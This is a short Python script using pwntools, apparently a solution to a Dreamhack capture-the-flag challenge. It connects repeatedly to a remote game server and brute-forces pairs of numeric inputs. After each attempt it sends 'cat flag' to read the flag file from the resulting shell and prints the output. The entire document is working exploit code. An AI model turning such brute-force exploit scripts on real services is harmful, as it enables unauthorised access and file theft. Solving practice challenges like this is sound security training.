from pwn import *

def fnc():
    for i in range(800):
        for j in range(256):
            pr = remote('host1.dreamhack.games',19132)

            pr.sendline(f'{i+0x311}')
            pr.sendline(f'{j}')
            try:
                pr.sendline(b'cat flag')
                print(pr.recvall())
                return
            except:
                continue

fnc()
